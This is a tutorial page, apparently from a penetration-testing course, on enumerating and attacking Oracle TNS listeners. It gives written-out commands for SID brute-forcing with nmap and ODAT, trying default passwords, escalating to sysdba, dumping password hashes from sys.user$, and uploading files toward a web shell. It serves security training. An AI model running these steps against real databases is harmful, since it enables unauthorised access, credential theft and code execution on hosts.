@@ -1,0 +1,219 @@
+# Oracle TNS
+
+> The Oracle TNS listener is the front door to Oracle databases — and a frequently neglected one. Default passwords that admins forget to change, guessable SIDs, and the `sysdba` escalation path turn a listener on port 1521 into database access, password hashes to crack offline, and sometimes a web shell on the host.
+
+<Note>**Protocol:** TCP · **Port:** 1521</Note>
+
+---
+
+## What Is Oracle TNS?
+
+The **Oracle Transparent Network Substrate (TNS)** is the communication protocol between Oracle databases and client applications. It supports multiple networking stacks (IPX/SPX, TCP/IP) and has built-in encryption — which is why it's the go-to for large, complex databases in healthcare, finance, and retail.
+
+The TNS **listener** is the server-side process that receives client connection requests and routes them to the right database instance.
+
+---
+
+## Default Configuration
+
+By default the listener accepts connections on **TCP 1521**, and can listen on specific interfaces or all of them. Oracle TNS could be remotely managed in **8i/9i**, but not in **10g/11g**.
+
+The two key config files live in `$ORACLE_HOME/network/admin`:
+
+- **`tnsnames.ora`** — _client-side_. Resolves service names to network addresses. Each database/service has an entry with a name, network location, and the service name clients use to connect.
+- **`listener.ora`** — _server-side_. Defines the listener's properties: which services it listens for and how it behaves.
+
+A simple `tnsnames.ora` entry:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+ORCL =
+  (DESCRIPTION =
+    (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
+    (CONNECT_DATA =
+      (SERVER = DEDICATED)
+      (SERVICE_NAME = orcl)
+    )
+  )
+```
+
+Here the `ORCL` service listens on TCP/1521 at `10.129.11.102`, and clients connect using the service name `orcl`.
+
+### Default Passwords
+
+Oracle's neglected-defaults problem is the recurring theme:
+
+| Service / Version | Default Credential          |
+| ----------------- | --------------------------- |
+| Oracle 9          | `CHANGE_ON_INSTALL`         |
+| Oracle 10         | _(no default password set)_ |
+| Oracle DBSNMP     | password `dbsnmp`           |
+
+<Tip>
+  Oracle 9's `CHANGE_ON_INSTALL` and the DBSNMP `dbsnmp` password are left in
+  place constantly — always try them. Many organizations also still run the
+  legacy `finger` service alongside Oracle, which can expose home directories
+  and put the database at further risk.
+</Tip>
+
+---
+
+## Footprinting the Service
+
+### Setting Up ODAT
+
+The **Oracle Database Attacking Tool (ODAT)** is the standard open-source tool for enumerating and exploiting Oracle databases — SID enumeration, SQL injection, RCE, and privilege escalation. It needs the Oracle Instant Client and a few packages. This Bash script sets it all up:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+#!/bin/bash
+sudo apt-get install libaio1 python3-dev alien -y
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+git submodule init
+git submodule update
+wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
+unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
+wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
+unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
+export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
+export PATH=$LD_LIBRARY_PATH:$PATH
+pip3 install cx_Oracle
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor passlib python-libnmap
+sudo apt-get install build-essential libgmp-dev -y
+pip3 install pycryptodome
+```
+
+Confirm it works:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+./odat.py -h
+```
+
+### Nmap
+
+Scan the default listener port:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+sudo nmap -p1521 -sV 10.129.11.102 --open
+```
+
+```
+PORT     STATE SERVICE    VERSION
+1521/tcp open  oracle-tns Oracle TNS Listener 11.2.0.2.0 (unauthorized)
+```
+
+### SID Enumeration
+
+A **SID (System Identifier)** uniquely names a database instance — a server can host many, each with its own SID. A client specifies the SID in its connection string to pick the instance; without one, the default from `tnsnames.ora` is used. Since you need a valid SID to connect, **guessing it is the first real hurdle** — use nmap, ODAT, or hydra:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Nmap SID brute-force
+sudo nmap -p1521 -sV --script oracle-sid-brute 10.129.11.102
+
+# ODAT — all enumeration modules at once
+./odat.py all -s 10.129.11.102
+```
+
+```
+[+] SIDs found: XE, ORCL, PLSExtProc
+```
+
+---
+
+## Connecting and Enumerating
+
+### sqlplus Login
+
+With a SID and credentials, log in:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+sqlplus scott/tiger@10.129.11.102/XE
+```
+
+<Note>
+  If you hit `sqlplus: error while loading shared libraries: libsqlplus.so`, register the client library path and refresh the linker cache:
+
+```bash
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
+sudo ldconfig
+```
+
+</Note>
+
+### Escalating to sysdba
+
+Once in, enumerate the current user's privileges and available tables:
+
+```sql theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+SELECT table_name FROM all_tables;
+SELECT * FROM user_role_privs;
+```
+
+If the account (e.g. `scott`) has the right privileges, you can log back in **as sysdba** — the System Database Admin — for far higher privileges:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+sqlplus scott/tiger@10.129.11.102/XE as sysdba
+```
+
+<Tip>
+  Logging in `as sysdba` is the privilege-escalation step. When a regular
+  account has been granted sysdba (often by a lazy admin, or because it's the
+  admin's own account), you jump from a low-privilege user to full database
+  administrator.
+</Tip>
+
+### Extracting Password Hashes
+
+As sysdba you can pull password hashes from `sys.user$` and crack them offline:
+
+```sql theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+SELECT name, password, spare4 FROM sys.user$;
+```
+
+```
+NAME       PASSWORD            SPARE4
+---------- ------------------- ----------------------------------------
+SYS        FED332D...          S:8F2D...;H:7A1B...
+SYSTEM     A1B2C3D...          S:9E3F...;H:2C4D...
+```
+
+### Web Shell Upload
+
+If the server also runs a web server and you know its document root, you can upload a web shell through the database for code execution. Try default web root paths if you can fingerprint the system, and **test with a harmless file first** — upload a text file with a known string before anything that might trip AV/IDS:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Upload a test file via ODAT
+./odat.py utlfile -s 10.129.11.102 -d XE -U scott -P tiger \
+  --sysdba --putFile C:\\inetpub\\wwwroot test.txt ./test.txt
+
+# Confirm it landed
+curl http://10.129.11.102/test.txt
+```
+
+<Note>
+  File upload requires the target to be running a web server *and* knowing its
+  document root. Always start with an innocuous test file to confirm the
+  technique works before uploading an actual shell.
+</Note>
+
+---
+
+## Quick Reference
+
+| Command                                         | Purpose                       |
+| ----------------------------------------------- | ----------------------------- |
+| `nmap -p1521 -sV <ip>`                          | Detect the TNS listener       |
+| `nmap -p1521 --script oracle-sid-brute <ip>`    | Brute-force SIDs              |
+| `./odat.py all -s <ip>`                         | Full ODAT enumeration         |
+| `sqlplus <user>/<pass>@<ip>/<SID>`              | Connect                       |
+| `sqlplus <user>/<pass>@<ip>/<SID> as sysdba`    | Connect with admin privileges |
+| `SELECT name, password, spare4 FROM sys.user$;` | Dump password hashes          |
+| `./odat.py utlfile ... --putFile <path>`        | Upload a file / web shell     |
+
+**Default creds to try:** Oracle 9 `CHANGE_ON_INSTALL` · DBSNMP `dbsnmp`.
+
+**The footprinting flow:** nmap for 1521 → brute-force the SID → try default credentials → log in with sqlplus → escalate `as sysdba` → dump `sys.user$` hashes to crack offline, or upload a web shell if a web server is present.
+
+---
+
+_This concludes the Services chapter. When a port turns up on a scan, jump straight to its page for the footprinting flow — each one stands on its own._
